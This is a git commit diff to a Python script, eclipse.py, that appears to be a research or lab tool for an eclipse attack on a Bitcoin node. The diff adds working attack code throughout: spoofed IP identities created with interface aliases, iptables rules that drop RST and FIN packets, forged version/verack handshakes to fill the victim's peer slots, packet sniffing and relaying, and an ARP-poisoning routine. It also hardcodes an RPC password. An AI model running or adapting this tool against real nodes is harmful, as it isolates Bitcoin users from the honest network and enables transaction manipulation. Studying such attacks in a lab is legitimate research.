7ca17d91e290eb651f3514eb1c94b9dd79d25898
SimeoW <simeonwuthier@gmail.com>
2020-04-10 12:50:14 -0600

    eclipse.py

--- tools/Networking/eclipse.py
+++ tools/Networking/eclipse.py
@@ -1,53 +1,80 @@
 from _thread import start_new_thread
 from scapy.all import *
+import socket
 import atexit
 import json
 import os
-
-
-import socket, time, bitcoin
+import time
+import bitcoin
 from bitcoin.messages import *
 from bitcoin.net import CAddress
 
+import fcntl
+import struct 
 
 # Percentage (0 to 1) of packets to drop, else: relayed to victim
-eclipse_packet_drop_rate = 0.5
+eclipse_packet_drop_rate = 0
 
-num_identities = 3
-network_interface = 'enp0s3'
-ip_alias_network_interface = 'wlan0'
 
-victim_ip = '10.0.2.7'
+num_identities = 10
+
+victim_ip = '10.0.2.4'
 victim_port = 8333
 
-attacker_ip = '10.0.2.6'
-attacker_port = random.randint(1024,65535)
+attacker_ip = '10.0.2.15'
 
+spoof_IP_interface = []
 spoof_IP_and_ports = []
 spoof_IP_sockets = []
 
 iptables_file_path = f'{os.path.abspath(os.getcwd())}/backup.iptables.rules'
 
-def ip_alias(ip_address):
-	print(f'Setting up IP alias {ip_address}')
-	global alias_num
-	#terminal(f'sudo iptables -i {ip_alias_network_interface}:{alias_num} {ip_address} up')
-	
-	terminal(f'iptables -t nat -A PREROUTING -d {ip_address} -j DNAT --to-destination 0.0.0.0')
-
-	#terminal(f'iptables -A INPUT -p tcp -s {ip_address} -j ACCEPT')
-	#terminal(f'iptables -A OUTPUT -p tcp -d  {ip_address} -j ACCEPT')
-	alias_num += 1
 
 def terminal(cmd):
 	# print('\n> '+cmd)
-	print(os.popen(cmd).read())
+	return os.popen(cmd).read()
 
 def bitcoin(cmd):
 	return os.popen('./../../src/bitcoin-cli -rpcuser=cybersec -rpcpassword=kZIdeN4HjZ3fp9Lge4iezt0eJrbjSi8kuSuOHeUkEUbQVdf09JZXAAGwF3R5R2qQkPgoLloW91yTFuufo7CYxM2VPT7A5lYeTrodcLWWzMMwIrOKu7ZNiwkrKOQ95KGW8kIuL1slRVFXoFpGsXXTIA55V3iUYLckn8rj8MZHBpmdGQjLxakotkj83ZlSRx1aOJ4BFxdvDNz0WHk1i2OPgXL4nsd56Ph991eKNbXVJHtzqCXUbtDELVf4shFJXame -rpcport=8332 ' + cmd).read()
 
+# Get the network interface
+def get_interface():
+	m = re.search(r'\n_gateway +[^ ]+ +[^ ]+ +[^ ]+ +([^ ]+)\n', terminal('arp'))
+	if m != None:
+		return m.group(1)
+	else:
+		print('ERROR: Network interface couldn\'t be found.')
+		sys.exit()
+
+# The IP constraint such that packets still come back to the sender
+def get_broadcast_address():
+	m = re.search(r'broadcast ([^ ]+)', terminal(f'ifconfig {network_interface}'))
+	if m != None:
+		return m.group(1)
+	else:
+		print('ERROR: Network broadcast IP couldn\'t be found.')
+		sys.exit()
+
+
+network_interface = get_interface().strip()
+broadcast_address = get_broadcast_address().strip()
+
+
+def ip_alias(ip_address):
+	global alias_num
+	print(f'Setting up IP alias {ip_address}')
+	interface = f'{network_interface}:{alias_num}'
+	terminal(f'sudo ifconfig {interface} {ip_address} netmask 255.255.255.0 up')
+	alias_num += 1
+	return interface
+
 def random_ip():
-	return '.'.join(map(str, (random.randint(0, 255) for _ in range(4))))
+	ip = broadcast_address
+	old_ip = ''
+	while(old_ip != ip):
+		old_ip = ip
+		ip = ip.replace('255', str(random.randint(0, 255)), 1)
+	return ip
 
 def version_packet(src_ip, dst_ip, src_port, dst_port):
 	msg = msg_version()
@@ -60,69 +87,6 @@ def version_packet(src_ip, dst_ip, src_port, dst_port):
 	msg.strSubVer = bitcoin_subversion.encode() # Look like a normal node
 	return msg
 
-def custom_packet(msgtype, src_ip, dst_ip, src_port, dst_port):
-	msg = None
-	if msgtype == 'version':
-		msg = msg_version(bitcoin_protocolversion)
-	elif msgtype == 'verack':
-		msg = msg_verack(bitcoin_protocolversion)
-	elif msgtype == 'addr':
-		msg = msg_addr(bitcoin_protocolversion)
-	elif msgtype == 'inv':
-		msg = msg_inv(bitcoin_protocolversion)
-	elif msgtype == 'getdata':
-		msg = msg_getdata(bitcoin_protocolversion)
-	#elif msgtype == 'merkleblock':
-	#	msg = msg_merkleblock(bitcoin_protocolversion)
-	elif msgtype == 'getblocks':
-		msg = msg_getblocks(bitcoin_protocolversion)
-	elif msgtype == 'getheaders':
-		msg = msg_getheaders(bitcoin_protocolversion)
-	elif msgtype == 'tx':
-		msg = msg_tx(bitcoin_protocolversion)
-	elif msgtype == 'headers':
-		msg = msg_headers(bitcoin_protocolversion)
-	elif msgtype == 'block':
-		msg = msg_block(bitcoin_protocolversion)
-	elif msgtype == 'getaddr':
-		msg = msg_getaddr(bitcoin_protocolversion)
-	elif msgtype == 'mempool':
-		msg = msg_mempool(bitcoin_protocolversion)
-	elif msgtype == 'ping':
-		msg = msg_ping(bitcoin_protocolversion)
-	elif msgtype == 'pong':
-		msg = msg_pong(bitcoin_protocolversion)
-	#elif msgtype == 'notfound':
-	#	msg = msg_notfound(bitcoin_protocolversion)
-	#elif msgtype == 'filterload':
-	#	msg = msg_filterload(bitcoin_protocolversion)
-	#elif msgtype == 'filteradd':
-	#	msg = msg_filteradd(bitcoin_protocolversion)
-	#elif msgtype == 'filterclear':
-	#	msg = msg_filterclear(bitcoin_protocolversion)
-	#elif msgtype == 'sendheaders':
-	#	msg = msg_sendheaders(bitcoin_protocolversion)
-	#elif msgtype == 'feefilter':
-	#	msg = msg_feefilter(bitcoin_protocolversion)
-	#elif msgtype == 'sendcmpct':
-	#	msg = msg_sendcmpct(bitcoin_protocolversion)
-	#elif msgtype == 'cmpctblock':
-	#	msg = msg_cmpctblock(bitcoin_protocolversion)
-	#elif msgtype == 'getblocktxn':
-	#	msg = msg_getblocktxn(bitcoin_protocolversion)
-	#elif msgtype == 'blocktxn':
-	#	msg = msg_blocktxn(bitcoin_protocolversion)
-	#elif msgtype == 'reject':
-	#	msg = msg_reject()
-	else:
-		return None
-
-	#msg.addrFrom.ip = src_ip
-	#msg.addrFrom.port = src_port
-	#msg.addrTo.ip = dst_ip
-	#msg.addrTo.port = dst_port
-	return msg
-
 # str_addrs = ['1.2.3.4', '5.6.7.8', '9.10.11.12'...]
 def addr_packet(str_addrs):
 	msg = msg_addr()
@@ -132,71 +96,102 @@ def addr_packet(str_addrs):
 		addr.port = 18333
 		addr.nTime = int(time.time())
 		addr.ip = i
- 
-		addrs.append( addr )
+
+		addrs.append(addr)
 	msg.addrs = addrs
 	return msg
 
+# Make web traffic go towards the fake IP
+def arp_poison(fake_ip, mac_address):
+	try:
+		for _ in range(5):
+			srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(psrc=fake_ip, hwsrc=mac_address), verbose=0, timeout=0.05)
+			time.sleep(0.05)
+	except socket.error:
+		# Are you sure you're running as root?
+		print('Error: You need to run this script as root.')
+		sys.exit()
+
+def get_mac_address(ifname):
+    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    info = fcntl.ioctl(s.fileno(), 0x8927,  struct.pack('256s', bytes(ifname, 'utf-8')[:15]))
+    return ':'.join('%02x' % b for b in info[18:24])
+
 def initialize_fake_connection(src_ip, dst_ip):
-	########## Temporary
-	src_ip = attacker_ip
-	##########
-	src_port = attacker_port
+	src_port = random.randint(1024, 65535)
 	dst_port = victim_port
+	print(f'Spoofing with IP ({src_ip} : {src_port}) to IP ({dst_ip} : {dst_port})...')
 
-	print(f'Spoofing with IP {src_ip}:{src_port} to IP {dst_ip}:{dst_port}')
-	
-	
-	"""seq = random.randrange(0,2**16)
-	ip = IP(src=src_ip, dst=dst_ip)
-	SYN = TCP(sport=src_port, dport=dst_port, flags='A', seq=seq)
-	#SYN = TCP(sport=src_port, dport=dst_port, flags='S', seq=1000)
-	SYNACK=sr1(ip/SYN)
-	#send(SYNACK)
-	#time.sleep(1)
-	#print('Sending second packet')
-	ack = SYNACK.seq + 1
-	seq += 1
-	ACK=TCP(sport=src_port, dport=dst_port, flags='A', seq=seq, ack=ack)
-	send(ip/ACK)
-	print('Handshake COMPLETE')
+	#terminal(f'sudo iptables -A OUTPUT -p tcp --tcp-flags RST RST -s {src_ip} -j DROP')
+	#terminal(f'sudo iptables -t nat -I POSTROUTING -o eth0 -d 1.2.3.4/0 -s 192.168.100.1 -j SNAT --to-source 192.168.100.2')
+	#terminal(f'iptables -t raw -A PREROUTING -p tcp -s {src_ip} -j DROP')
 
-	PUSH = TCP(sport=src_port, dport=dst_port, flags='PA', seq=11, ack=ack)
-	send(version_packet(src_ip, dst_ip, dst_port).to_bytes())
-	"""
+	spoof_interface = ip_alias(src_ip)
+	spoof_IP_interface.append((spoof_interface, src_ip))
+	print(f'Successfully set up IP alias on interface {spoof_interface}')
+	print('Resulting ifconfig interface:')
+	print(terminal(f'ifconfig {spoof_interface}').rstrip() + '\n')
 
-	ip_alias(src_ip)
+	print('Setting up iptables configurations')
+	terminal(f'sudo iptables -I OUTPUT -o {spoof_interface} -p tcp --tcp-flags ALL RST,ACK -j DROP')
+	terminal(f'sudo iptables -I OUTPUT -o {spoof_interface} -p tcp --tcp-flags ALL FIN,ACK -j DROP')
+	terminal(f'sudo iptables -I OUTPUT -o {spoof_interface} -p tcp --tcp-flags ALL FIN -j DROP')
+	terminal(f'sudo iptables -I OUTPUT -o {spoof_interface} -p tcp --tcp-flags ALL RST -j DROP')
 
-	
+
+	#print('ARP poisoning victim...')
+	#mac_address = get_mac_address(spoof_interface)
+	#arp_poison(src_ip, mac_address)
+
+	print('Creating network socket...')
 	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-	#s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP) #socket.AF_PACKET, socket.SOCK_RAW) #socket.AF_INET, socket.SOCK_STREAM)
-	#s.bind((src_ip, src_port))
-	#s.listen(1) # Queue up to 1 request
+	
+	#if not hasattr(s,'SO_BINDTODEVICE') :
+	#	socket.SO_BINDTODEVICE = 25
 
+	print(f'Setting socket network interface to "{network_interface}"...')
+	s.setsockopt(socket.SOL_SOCKET, socket.SO_BINDTODEVICE, str(network_interface + '\0').encode('utf-8'))
+	
+	#s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+
+	print(f'Binding socket to ({src_ip} : {src_port})...')
+	s.bind((src_ip, src_port))
+
+	#for a in dir(socket):
+	#	try:
+	#		print(f'{a}() = {getattr(socket,a)()}')
+	#	except:
+	#		pass
+	
+	print(f'Connecting ({src_ip} : {src_port}) to ({dst_ip} : {dst_port})...')
 	s.connect((dst_ip, dst_port))
+
 	# Send version packet
+	print('\nSending VERSION packet')
 	version = version_packet(src_ip, dst_ip, src_port, dst_port)
 	print(version)
 	s.send(version.to_bytes())
+
 	# Get verack packet
-	print('\n\n*** ')
+	print('\nReceiving VERACK packet')
 	print(s.recv(1924)) # Next message received must be <= 1924 bytes
 	# Send verack packet
-	
+	print('Received VERACK response')
+
+	print('\nSending VERACK packet')
 	verack = msg_verack()
 	print(verack)
 	s.send(verack.to_bytes())
 	# Get verack packet
-	print('\n\n*** ')
+	print('\nReceiving VERACK packet')
 	print(s.recv(1024)) # Next message received must be <= 1024 bytes
-	
 
 	spoof_IP_and_ports.append((src_ip, src_port))
 	spoof_IP_sockets.append(s)
 
-	print('\n\n*** ')
+	print('\n\n')
 	print('CONNECTION ESTABLISHED')
-	
+
 	#time.sleep(5)
 	#s.close()
 	#print('CONNECTION CLOSED')
@@ -233,12 +228,20 @@ def packet_received(packet):
 				print(f'Relaying {msgtype} from {packet[IP].src} to {rand_ip}:{rand_port}')
 				#packet[IP].src = rand_ip
 				#packet[IP].dst = victim_ip
+
 				try:
 					#custom = custom_packet(msgtype, rand_ip, victim_ip, rand_port, victim_port)
-					#rand_socket.send(custom.to_bytes())
-					rand_socket.send(to_bytes(from_bytes(raw(packet))))
-				except:
+					#if custom is not None:
+					#	rand_socket.send(custom.to_bytes())
+
+					ip = IP(dst = victim_ip)
+					tcp = TCP(sport=rand_port, dport=victim_port, flags='S')
+					new_packet = ip/tcp/packet[TCP].payload
+					rand_socket.send(bytes(new_packet))
+
+				except Exception as e:
 					print('Relaying message FAILED')
+					print(e)
 
 	if msgtype == 'verack':
 		# Successful connection! Move from pending to successful
@@ -268,15 +271,21 @@ def backup_iptables():
 
 def cleanup_iptables():
 	if(os.path.exists(iptables_file_path)):
-		print('Cleaning up iptables...')
+		print('Cleaning up iptables configuration')
 		terminal(f'iptables-restore < {iptables_file_path}')
 		os.remove(iptables_file_path)
+
+def cleanup_ipaliases():
+	for interface, ip in spoof_IP_interface:
+		print(f'Cleaning up IP alias {ip} on {interface}')
+		terminal(f'sudo ifconfig {interface} {ip} down')
 
 # Ran when the script ends
 def on_close():
 	for socket in spoof_IP_sockets:
 		print(f'CLOSING SOCKET {socket}')
 		socket.close()
+	cleanup_ipaliases()
 	cleanup_iptables()
 	print('Goodbye.')
 
@@ -285,63 +294,35 @@ def on_close():
 if __name__ == '__main__':
 	global alias_num
 	alias_num = 0 # Increments each alias
-	
+
 	initialize_network_info()
-
-
-	custom_packet('version',attacker_ip, victim_ip, attacker_port, victim_port)
-	custom_packet('verack',attacker_ip, victim_ip, attacker_port, victim_port)
-	custom_packet('addr',attacker_ip, victim_ip, attacker_port, victim_port)
-	custom_packet('inv',attacker_ip, victim_ip, attacker_port, victim_port)
-	custom_packet('getdata',attacker_ip, victim_ip, attacker_port, victim_port)
-	custom_packet('merkleblock',attacker_ip, victim_ip, attacker_port, victim_port)
-	custom_packet('getblocks',attacker_ip, victim_ip, attacker_port, victim_port)
-	custom_packet('getheaders',attacker_ip, victim_ip, attacker_port, victim_port)
-	custom_packet('tx',attacker_ip, victim_ip, attacker_port, victim_port)
-	custom_packet('headers',attacker_ip, victim_ip, attacker_port, victim_port)
-	custom_packet('block',attacker_ip, victim_ip, attacker_port, victim_port)
-	custom_packet('getaddr',attacker_ip, victim_ip, attacker_port, victim_port)
-	custom_packet('mempool',attacker_ip, victim_ip, attacker_port, victim_port)
-	custom_packet('ping',attacker_ip, victim_ip, attacker_port, victim_port)
-	custom_packet('pong',attacker_ip, victim_ip, attacker_port, victim_port)
-	custom_packet('notfound',attacker_ip, victim_ip, attacker_port, victim_port)
-	custom_packet('filterload',attacker_ip, victim_ip, attacker_port, victim_port)
-	custom_packet('filteradd',attacker_ip, victim_ip, attacker_port, victim_port)
-	custom_packet('filterclear',attacker_ip, victim_ip, attacker_port, victim_port)
-	custom_packet('sendheaders',attacker_ip, victim_ip, attacker_port, victim_port)
-	custom_packet('feefilter',attacker_ip, victim_ip, attacker_port, victim_port)
-	custom_packet('sendcmpct',attacker_ip, victim_ip, attacker_port, victim_port)
-	custom_packet('cmpctblock',attacker_ip, victim_ip, attacker_port, victim_port)
-	custom_packet('getblocktxn',attacker_ip, victim_ip, attacker_port, victim_port)
-	custom_packet('blocktxn',attacker_ip, victim_ip, attacker_port, victim_port)
-	custom_packet('reject',attacker_ip, victim_ip, attacker_port, victim_port)
-
 	atexit.register(on_close)
 	cleanup_iptables()
 	backup_iptables()
 
 	#terminal(f'sudo iptables -A OUTPUT -p tcp --tcp-flags RST RST -s {victim_ip} -dport {victim_port} -j DROP')
-	terminal('sudo iptables -A OUTPUT -p tcp --tcp-flags RST RST -j DROP')
+	#terminal('sudo iptables -A OUTPUT -p tcp --tcp-flags RST RST -j DROP')
 	# Make the spoofing IP up
 	#terminal('sudo iptables -A INPUT -m state --state NEW ! -i wlan0 -j ACCEPT')
 	#terminal('sudo ifconfig wlan0 up')
 
 	#time.sleep(10)
-	try:
-		start_new_thread(sniff, (), {
-			'iface':network_interface,
-			'prn':packet_received,
-			'filter':'tcp',
-			'store':1
-		})
-	except:
-		print('Error: unable to start thread')
 
 	for i in range(1, num_identities + 1):
 		try:
 			initialize_fake_connection(src_ip = random_ip(), dst_ip = victim_ip)
 		except ConnectionRefusedError:
 			print('Connection was refused. The victim\'s node must not be running.')
+	for interface, ip in spoof_IP_interface:
+		try:
+			start_new_thread(sniff, (), {
+				'iface':interface,
+				'prn':packet_received,
+				'filter':'tcp',
+				'store':1
+			})
+		except:
+			print('Error: unable to  start thread')
 	print(f'Successful connections: {len(spoof_IP_and_ports)}\n')
 
 
